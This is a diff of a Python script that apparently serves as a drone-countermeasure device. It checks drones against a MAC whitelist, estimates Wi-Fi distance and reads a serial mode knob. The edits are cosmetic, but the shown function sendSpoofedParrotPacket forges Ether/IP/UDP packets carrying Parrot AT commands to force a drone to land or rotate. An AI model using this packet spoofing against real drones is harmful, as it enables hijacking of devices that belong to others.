@@ -7,7 +7,7 @@ import serial
 import re
 import os
 
-def readConfig(): #TODO implement it - it reads the config file and returns the whitelist of drones (string array of MAC addresses) and other config data (not used yet)
+def readConfig():
 	return (readWhitelist(), readRange())
 
 def readWhitelist():
@@ -49,7 +49,7 @@ def readKnobState():
 	ser.flushInput() #flush serial to get the newest data
 	sleep(2) #wait for the data
 	modeStr = ""
-	while (not modeStr.isdigit()) or int(modeStr) > 3:
+	while (not modeStr.isdigit()) or (int(modeStr) > 3):
 		modeStr=ser.readline().rstrip()
 		sleep(0.1)
 	mode = int(modeStr)
@@ -93,7 +93,7 @@ def getWifiDistance(interface, ap):
 	aps = Cell.all(interface)
 	for apA in aps:
 		if(apA.address == ap.address):
-			return -1* apA.signal #originally a negative number, closer to 0 - closer the AP
+			return -1 * apA.signal #originally a negative number, closer to 0 - closer the AP
 	return 0 #if no longer here, exit
 
 def disconnectFromWifi(interface):
@@ -133,7 +133,7 @@ def pkt_callback(pkt):
 		m = p.search(pkt[Raw].load)
 		seqNr = int(m.group(1))
 
-def sendSpoofedParrotPacket(command, interface, srcMAC, dstMAC, srcIP, dstIP, seqNr, count): #TODO test warn
+def sendSpoofedParrotPacket(command, interface, srcMAC, dstMAC, srcIP, dstIP, seqNr, count):
 	part1 = ""
 	part2 = ""
 	if command == "land":
@@ -144,7 +144,7 @@ def sendSpoofedParrotPacket(command, interface, srcMAC, dstMAC, srcIP, dstIP, se
 		part2 = "0,0,0,0,0,0,0"
 	elif command == "warn": #slowly rotate
 		part1 = "PCMD_MAG"
-		part2 = "0,0,0,0,-50000000,0,0" #"1,0,0,0,1" #last value is the angular speed [-1,1] -1082130432
+		part2 = "0,0,0,0,-50000000,0,0"
 	elif command == "release":
 		part1 = "PCMD_MAG"
 		part2 = "0,0,0,0,0,0,0"
@@ -153,8 +153,7 @@ def sendSpoofedParrotPacket(command, interface, srcMAC, dstMAC, srcIP, dstIP, se
 	
 	for i in range(1, count+1):
 		payload = "AT*" + part1 + "=" + str(seqNr+i+1000000) + "," + part2 + "\r"
-		print payload
+		#print payload
 		spoofed_packet = Ether(src=srcMAC, dst=dstMAC) / IP(src=srcIP, dst=dstIP) / UDP(sport=5556, dport=5556) / payload
 		sendp(spoofed_packet, iface=interface)
 		sleep(0.3)
-
